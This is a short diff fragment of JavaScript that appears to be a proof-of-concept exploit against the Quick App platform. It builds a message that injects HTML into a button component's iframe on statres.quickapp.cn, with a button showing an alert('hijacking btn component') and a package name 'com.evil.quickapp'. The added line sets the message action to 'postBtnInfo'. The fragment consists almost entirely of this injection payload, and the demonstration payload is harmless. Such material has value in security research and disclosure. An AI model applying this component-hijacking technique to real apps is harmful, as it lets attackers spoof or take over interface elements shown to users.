@@ -9,6 +9,7 @@
                 var ifr2 = ifr.window.document.getElementsByClassName('qa-inner-iframe')[0];
                //ifr2.src="https://statres.quickapp.cn/quickapp/js/btn.html?iframeIndex=1&designWidth=1080&fontSize=16"; 
                var senddata  = {
+                   "_action":"postBtnInfo",
                     "innerCode": "\n <templates style=\"display: none;\">\n    <div id=\"container\">\n      <button onclick=\"alert('hijacking btn component')\">hijacking</button>\n    </div>\n  </templates>\n  <styles style=\"display: none;\">\n    #container{\n        padding-top:100px;\n    }\n    button{\n        font-size: 16px;\n        color: #fffff;\n    }\n  </styles>\n<iframe class=\"qa-inner-iframe\" src=\"https://statres.quickapp.cn/quickapp/js/btn.html?iframeIndex=0&amp;designWidth=1080&amp;fontSize=16\" scrolling=\"no\" frameborder=\"no\" style=\"width: 100%; height: 2rem;\"></iframe>",
                     "routerData":{
                         "packageName":"com.evil.quickapp",
